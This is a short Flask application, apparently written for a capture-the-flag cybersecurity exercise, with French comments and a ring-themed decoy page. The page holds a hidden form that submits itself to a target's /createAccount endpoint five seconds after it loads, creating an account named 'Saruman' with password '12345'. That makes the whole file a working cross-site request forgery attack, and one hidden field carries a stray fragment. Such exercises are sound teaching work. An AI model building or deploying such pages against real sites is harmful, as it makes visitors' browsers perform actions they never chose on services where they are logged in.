from flask import Flask, request, jsonify, make_response, render_template
import requests
import json
import jinja2
import os

app = Flask('CSRF')

#BACKEND_IP = '127.0.0.1'
#BACKEND_PORT = '5556'
#TARGET_URL = 'http://' + BACKEND_IP + ':' + BACKEND_PORT + '/createAccount'

# pour la remise http://ctf3-cybersecurity.ddnsfree.com:8080
# TARGET_URL = 'http://ctf3-cybersecurity.ddnsfree.com:8080/createAccount'

def build_home_page():
    url = os.environ["CYBER_CSRF_URL"]
    return '''<html>
    <header></header>
    <body>
        <h1>CSRF</h1>
        <h4>Wow! De belles bagues!</h4>
        <form action=''' + url + ''' method="POST" name="csrf">
            <input type="hidden" name="username" value="Saruman").">
            <input type="hidden" name="password" value="12345">
        </form>

        <script>
            var wait=setTimeout("document.csrf.submit();", 5000);
        </script>

        <p>Bagues!!!!!!!!</p>
        <p>Encore plus de bagues!</p>
    </body>
    </html>
    '''

@app.route('/')
def hello():
	return build_home_page()

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5557)